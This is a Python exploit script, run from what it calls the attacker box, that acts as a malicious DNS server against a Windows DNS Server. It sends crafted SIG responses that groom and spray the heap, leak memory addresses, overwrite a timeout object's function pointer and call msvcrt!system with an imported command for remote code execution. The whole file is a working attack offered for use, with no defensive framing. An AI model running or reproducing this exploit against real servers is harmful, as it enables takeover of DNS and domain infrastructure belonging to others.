#!/usr/bin/env python

# This code is run on the Linux attacker box - it's a DNS server listener that the victim Windows DNS server will contact.

import os
import socket
import struct
import threading

from payload import system_arg


FREELIST_MAX = 3333
subdomain = [b'dw', b'dx', b'dy', b'dz', b'd0', b'd1', b'd2', b'd3']
socket.setdefaulttimeout(3)


def done(sock):
    try:
        sock.shutdown(socket.SHUT_RDWR)
        sock.close()
    except Exception as e:
        pass


# The TCP port is contacted second
def tcp_server():
    global stop_server
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', 53))
    sock.listen(50)
    response = ''
    
    exploit = 0
    freelist_cut = 0

    while not stop_server:
        if freelist_cut >= FREELIST_MAX:
            print('[!] done grooming small buffer freelist')
            break
        try:
            connection, client_address = sock.accept()
            data = b''

            try:
                data += connection.recv(65535)
            except Exception as e:
                pass

            # Find compressed domain name '9.'
            domain_start = data.find(b'\x01\x39') + 2
            domain_end = data.find(b'\x00', domain_start)
            requested_domain = data[domain_start:domain_end + 1]

            if requested_domain.find(b'lol') != -1:
                freelist_cut += 1

            # SIG Contents
            sig =  b'\x00\x01' # Type covered
            sig += b'\x05' # Algorithm - RSA/SHA1
            sig += b'\x00' # Labels
            sig += b'\x00\x00\x00\x10' # TTL
            sig += b'\x68\x76\xA2\x1F' # Signature Expiration
            sig += b'\x5D\x2C\xCA\x1F' # Signature Inception
            sig += b'\x9E\x04' # Key Tag
            sig += b'\xC0\x0C' # Signers Name - points to 9.domain

            sig += (b'\x00').ljust(0x20 - len(requested_domain), b'\x00') # Signature - trigger allocation of 0x88 byte buffer

            # SIG Header
            hdr =  b'\xC0\x0C' # Points to '9.domain'
            hdr += b'\x00\x18' # Type: SIG
            hdr += b'\x00\x01' # Class: IN

            hdr += b'\x00\x00\x00\x10' # TTL

            hdr += struct.pack('>H', len(sig)) # Data Length

            # DNS Header
            response =  b'\x81\xA0' # Flags: Response + Truncated + Recursion Desired + Recursion Available
            response += b'\x00\x01' # Questions
            response += b'\x00\x01' # Answer RRs
            response += b'\x00\x00' # Authority RRs
            response += b'\x00\x00' # Additional RRs
            response += b'\x019' + requested_domain # Name (9.domain)
            response += b'\x00\x18' # Type: SIG
            response += b'\x00\x01' # Class: IN
            
            len_msg = len(response + hdr + sig) + 2 # +2 for the transaction ID
            # Msg Size + Transaction ID + DNS Headers + Answer Headers + Answer (Signature)
            connection.sendall(struct.pack('>H', len_msg) + data[2:4] + response + hdr + sig)
            connection.close()
        except Exception as e:
            pass

    if stop_server:
        done(sock)

    while not stop_server:
        try:
            connection, client_address = sock.accept()
            data = b''
            try:
                data += connection.recv(65535)
            except Exception as e:
                pass
            
            # Find compressed domain name '9.'
            domain_start = data.find(b'\x01\x39') + 2
            domain_end = data.find(b'\x00', domain_start)
            requested_domain = data[domain_start:domain_end + 1]

            if requested_domain[1:3] == subdomain[0]:
                first = True
            else:
                first = False

            # SIG Contents
            sig = b'\x00\x01' # Type covered
            sig += b'\x05' # Algorithm - RSA/SHA1
            sig += b'\x00' # Labels
            if first:
                sig += b'\x00\x00\x00\x10' # TTL
            else:
                sig += b'\x00\x00\x20\x00' # TTL

            sig += b'\x68\x76\xA2\x1F' # Signature Expiration
            sig += b'\x5D\x2C\xCA\x1F' # Signature Inception
            sig += b'\x9E\x04' # Key Tag
            if (exploit > 0) and first:
                sig += b'\xC0\x0D' # Signers Name - Points to the '9' in 9.domain.
            else:
                sig += b'\xC0\x0C' # Signers Name - points to 9.domain

            if (exploit > 0) and first:

                sigtemp = (b'\x00'*(0x15 - len(requested_domain)) +  (b'\x0F' + b'\xFF'*0xF)*5 + b'\x00\x00')
                sigtemp += b'\x33'*(len(requested_domain) - 0x15 + 0xA7)
            
                if (exploit == 1):
                    print('[!] re-allocation triggered! this should overwrite some cache buffers')

                    # 9.dz - leak pt 1
                    sigtemp += b'\x00\x00\x00\x00\xBB\x22\xA3\x00\xEF\x0C\x0C\x0C\x0C\x0C\x0C\xFE'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x61\x80\x00\x00\x18\x00\xFF\x00'
                    sigtemp += b'\x85\x01\x00\x00\x85\x21\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

                    # 9.d0 - freed, leak heap ptr
                    sigtemp += b'\x00\x00\x00\x00\xBB\x22\xA3\x00\xEF\x0C\x0C\x0C\x0C\x0C\x0C\xFE'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x61\x80\x00\x00\x18\x00\x58\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

                    # 9.d1 - leak pt 2
                    sigtemp += b'\x00\x00\x00\x00\xBB\x22\xA3\x00\xEF\x0C\x0C\x0C\x0C\x0C\x0C\xFE'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x61\x80\x00\x00\x18\x00\xFF\x00'
                    sigtemp += b'\x84\x01\x00\x00\x84\x21\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

                    # 9.d2 - freed, alloc timeout obj
                    sigtemp += b'\x00\x00\x00\x00\xBB\x22\x50\x00\xEF\x0C\x0C\x0C\x0C\x0C\x0C\xFE'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x61\x80\x00\x00\x18\x00\x18\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

                    # 9.d3 - freed, leaked heap ptr
                    sigtemp += b'\x00\x00\x00\x00\xBB\x22\xA3\x00\xEF\x0C\x0C\x0C\x0C\x0C\x0C\xFE'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x61\x80\x00\x00\x18\x00\x58\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

                if (exploit == 2):

                    print('[!] timeout object pFreeFunction overwritten for arbitrary read')

                    with open('heapleak', 'rb') as f:
                        heapleak_bytes = f.read()
                        heap_ptr = struct.unpack('<Q',heapleak_bytes)[0]
                        print('[+] heap parameter to NsecDnsRecordConvert: 0x%lx' % heap_ptr)
                        heap_ptr -= 0x10 + 0xa0

                    with open('dnsleak', 'rb') as f:
                        dnsleak_bytes = f.read()
                        print('[+] dns!NsecDNSRecordConvert addr: 0x%lx' % struct.unpack('<Q',dnsleak_bytes[0:8])[0])
                        print('[+] dns!_imp_exit addr: 0x%lx' % struct.unpack('<Q', dnsleak_bytes[8:])[0])

                    # 9.dz - leak pt 1
                    sigtemp += b'\x00\x00\x00\x00\xBB\x22\xA3\x00\xEF\x0C\x0C\x0C\x0C\x0C\x0C\xFE'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x61\x80\x00\x00\x18\x00\xFF\x00'
                    sigtemp += b'\x85\x01\x00\x00\x85\x21\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

                    # 9.d0 - is free, gets alloc'd during call to NsecDnsRecordConvertOffset
                    sigtemp += b'\x00\x00\x00\x00\xEE\x22\xA3\x00'
                    sigtemp += struct.pack('<Q', 0x0)
                    sigtemp += b'\xEF\x0B\x0B\xFE\xEF\x0B\x0B\xFE\x61\x80\x00\x00\x18\x00\x58\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x05\x00\x00\x00\x20\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

                    # 9.d1 - freed, alloc another fake timeout obj here
                    sigtemp += b'\x00\x00\x00\x00\xBB\x22\x50\x00\xEF\x0C\x0C\x0C\x0C\x0C\x0C\xFE'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x61\x80\x00\x00\x18\x00\x18\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

                    # 9.d2 - fake timeout obj to call NsecDnsRecordConvertOffset
                    sigtemp += b'\x00\x00\x00\x00\xBB\x07\x50\x00\xEF\x0C\x0C\x0C\x0C\x0C\x0C\xFE'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += heapleak_bytes
                    sigtemp += dnsleak_bytes[0:8]
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x05\x00\x00\x00\x20\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

                    # 9.d3 - this is the buffer that is passed as the parameter to NsecDnsRecordConvertOffset
                    sigtemp += b'\x00\x00\x00\x00\xBB\x22\xA3\x00\xEF\x0C\x0C\x0C\x0C\x0C\x0C\xFE'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += dnsleak_bytes[8:]
                    sigtemp += struct.pack('<H', 0x6D)
                    sigtemp += b'\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

                if (exploit == 3):

                    print('[!] timeout object pFreeFunction overwritten for RCE!')

                    with open('sysleak', 'rb') as f:
                        sysleak_bytes = f.read()
                        print('[+] msvcrt!system addr: 0x%lx' % struct.unpack('<Q',sysleak_bytes)[0])

                    # 9.dz - not used this time
                    sigtemp += b'\x00\x00\x00\x00\xBB\x22\xA3\x00\xEF\x0C\x0C\x0C\x0C\x0C\x0C\xFE'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x61\x80\x00\x00\x18\x00\xFF\x00'
                    sigtemp += b'\x85\x01\x00\x00\x85\x21\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

                    # 9.d0 - not used this time
                    sigtemp += b'\x00\x00\x00\x00\xBB\x22\xA3\x00\xEF\x0C\x0C\x0C\x0C\x0C\x0C\xFE'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x61\x80\x00\x00\x18\x00\x58\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

                    # 9.d1 - fake timeout obj to call msvcrt!system (possible location)
                    sigtemp += b'\x00\x00\x00\x00\xBB\x07\x50\x00\xEF\x0C\x0C\x0C\x0C\x0C\x0C\xFE'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += heapleak_bytes
                    sigtemp += sysleak_bytes
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x05\x00\x00\x00\x20\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

                     # 9.d2 - fake timeout obj to call msvcrt!system (possible location)
                    sigtemp += b'\x00\x00\x00\x00\xBB\x07\x50\x00\xEF\x0C\x0C\x0C\x0C\x0C\x0C\xFE'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += heapleak_bytes
                    sigtemp += sysleak_bytes
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x05\x00\x00\x00\x20\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

                    # 9.d3 - this is the ptr+0x10 is passed as the parameter to msvcrt!system
                    sigtemp += b'\x00\x00\x00\x00\xBB\x22\xA3\x00\xEF\x0C\x0C\x0C\x0C\x0C\x0C\xFE'
                    sigtemp += system_arg
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
                    sigtemp += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

                sig += sigtemp.ljust(0xFFB9, b'\x00')

            elif (exploit > 1) and (requested_domain[1:3] in subdomain):
                sig += (b'\x00').ljust(0x1A - len(requested_domain) , b'\x00')
            else:
                # Spray
                sig += (b'\x00').ljust(0x42 - len(requested_domain), b'\x00') # Record of size 0x58 -> total buffer size 0xA0

            if first:
                exploit +=1

            # SIG Header
            hdr =  b'\xC0\x0C' # Points to '9.domain'
            hdr += b'\x00\x18' # Type: SIG
            hdr += b'\x00\x01' # Class: IN
            
            if first:
                hdr += b'\x00\x00\x00\x10' # TTL
            else:
                hdr += b'\x00\x00\x20\x00' # TTL
            hdr += struct.pack('>H', len(sig)) # Data Length

            # DNS Header
            response =  b'\x81\xA0' # Flags: Response + Truncated + Recursion Desired + Recursion Available
            response += b'\x00\x01' # Questions
            response += b'\x00\x01' # Answer RRs
            response += b'\x00\x00' # Authority RRs
            response += b'\x00\x00' # Additional RRs
            response += b'\x019' + requested_domain # Name (9.domain)
            response += b'\x00\x18' # Type: SIG
            response += b'\x00\x01' # Class: IN
            
            len_msg = len(response + hdr + sig) + 2 # +2 for the transaction ID
            # Msg Size + Transaction ID + DNS Headers + Answer Headers + Answer (Signature)
            connection.sendall(struct.pack('>H', len_msg) + data[2:4] + response + hdr + sig)
            connection.close()
        except Exception as e:
            pass

    done(sock)


# The UDP server is contacted first
def udp_server():
    global stop_server
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_address = '0.0.0.0'
    server_port = 53

    sock.bind((server_address, server_port))
    while not stop_server:
        try:
            recvd, client_address = sock.recvfrom(65535)

            # Find compressed domain name '9.'
            domain_start = recvd.find(b'\x01\x39') + 2
            domain_end = recvd.find(b'\x00', domain_start)
            requested_domain = recvd[domain_start:domain_end + 1]
            qtype = recvd[domain_end + 1:domain_end + 3]

            if qtype == b'\x00\x02':
                response = b'\x81\x80' # Flags: Response + Truncated + Recursion Desired + Recursion Available
                response += b'\x00\x01' # Questions
                response += b'\x00\x01' # Answer RRs
                response += b'\x00\x00' # Authority RRs
                response += b'\x00\x00'# Additional RRs

                # Queries
                response += b'\x019' + requested_domain # Name
                response += b'\x00\x02' # Type: NS
                response += b'\x00\x01'# Class: IN

                # Answers
                response += b'\xC0\x0C' # Compressed pointer to domain
                response += b'\x00\x02' # Type: NS
                response += b'\x00\x01'# Class: IN
                response += b'\x00\x00\x00\x10' # TTL

                data = b'\x03ns1\xC0\x12' # ns1 + pointer to domain

                response += struct.pack('>H', len(data)) # Data Length

                if len(recvd) > 2:
                    sent = sock.sendto(recvd[:2] + response + data, client_address)
            else:
                response =  b'\x83\x80' # Flags: Response + Truncated + Recursion Desired + Recursion Available
                response += b'\x00\x01' # Questions
                response += b'\x00\x00' # Answer RRs
                response += b'\x00\x01' # Authority RRs
                response += b'\x00\x00' # Additional RRs

                # Queries
                response += b'\x019' + requested_domain # Name
                response += b'\x00\x18' # Type: SIG
                response += b'\x00\x01' # Class: IN

                # Data
                data =  b'\x03ns1\xC0\x0C' # ns1 + pointer to domain
                data += b'\x03ms1\xC0\x0C' # ms1 + pointer to domain
                data += b'\x0B\xFF\xB4\x5F' # Serial Number
                data += b'\x00\x00\x0E\x10' # Refresh Interval
                data += b'\x00\x00\x2A\x30' # Response Interval
                data += b'\x00\x01\x51\x80' # Expiration Limit
                data += b'\x00\x00\x00\x10' # Minimum TTL

                # Authoritative Nameservers
                response += b'\xC0\x0C' # Compressed pointer to domain
                response += b'\x00\x06' # Type: SOA
                response += b'\x00\x01' # Class: IN
                response += b'\x00\x00\x00\x20' # TTL
                response += struct.pack('>H', len(data)) # Data Length

                if len(recvd) > 2:
                    sent = sock.sendto(recvd[:2] + response + data, client_address)

        except Exception as e:
            pass

    done(sock)


def main():
    global stop_server

    stop_server = False   
    os.system('systemctl stop systemd-resolved')

    # Sets up two servers: one on UDP port 53 and one on TCP port 53
    first = threading.Thread(target=udp_server)
    second = threading.Thread(target=tcp_server)

    first.daemon = True
    second.daemon = True

    first.start()
    second.start()

    input('[!] press any key to stop evil dns server\n')
    
    stop_server = True
    first.join()
    second.join()
    os.system('systemctl start systemd-resolved')
    os._exit(0)


if __name__ == '__main__':
    main()